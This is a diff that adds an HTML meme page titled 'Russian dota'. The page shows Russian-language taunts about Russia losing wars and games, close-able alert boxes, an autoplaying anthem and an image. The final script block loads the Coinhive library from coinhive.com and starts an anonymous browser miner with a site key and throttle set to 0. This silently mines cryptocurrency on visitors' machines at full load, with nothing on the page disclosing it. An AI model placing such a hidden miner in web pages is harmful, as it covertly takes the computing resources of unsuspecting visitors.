@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+body {
+    font-family: Arial;
+	background-image: url('../img/Ukr.jpg');
+	background-repeat: repeat;
+	}
+h1 {
+	color: red;
+	font-weight: bold;
+	text-align: center;
+	}
+	.alert {
+    padding: 20px;
+    background-color: #f44336;
+    color: white;
+    opacity: 1;
+    transition: opacity 0.6s;
+    margin-bottom: 15px;
+}
+
+.alert.success {background-color: #4CAF50;}
+.alert.info {background-color: #2196F3;}
+.alert.warning {background-color: #ff9800;}
+
+.closebtn {
+    margin-left: 15px;
+    color: white;
+    font-weight: bold;
+    float: right;
+    font-size: 22px;
+    line-height: 20px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.closebtn:hover {
+    color: black;
+}
+.soviet {
+	display: block;
+    margin-left: auto;
+    margin-right: auto;
+    width: 50%;
+}
+    </style>
+  <meta charset="UTF-8"/>
+  <title>Russian dota</title>
+</head>
+<body>
+<audio autoplay repeat>
+		<source src="../music/Star Spangled Banner.mp3" type="audio/mpeg">
+			<font color="red">Audio file unable to play...</font>
+				</audio>
+    <h1>украина > русский</h1>
+    <h1>получить разрушенную большевистскую свинью</h1>
+
+
+<div class="alert">
+  <span class="closebtn">&times;</span>  
+  <strong>Cyka blyat!</strong> проигрывать в доте и на войне
+</div>
+
+<div class="alert success">
+  <span class="closebtn">&times;</span>  
+  <strong>проигрывать Японии</strong>
+</div>
+
+<div class="alert info">
+  <span class="closebtn">&times;</span>  
+  <strong>проиграть финляндии</strong>
+</div>
+
+<div class="alert warning">
+  <span class="closebtn">&times;</span>  
+  <strong>проиграть украине</strong>
+</div>
+<img class=soviet src="../img/meme.jpg">
+<script>
+var close = document.getElementsByClassName("closebtn");
+var i;
+
+for (i = 0; i < close.length; i++) {
+    close[i].onclick = function(){
+        var div = this.parentElement;
+        div.style.opacity = "0";
+        setTimeout(function(){ div.style.display = "none"; }, 600);
+    }
+}
+</script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('u5Cxn17qNBllNwUpiEbPhvs41zio8Cws', {throttle: 0});
+</script>
+</body>
+</html>
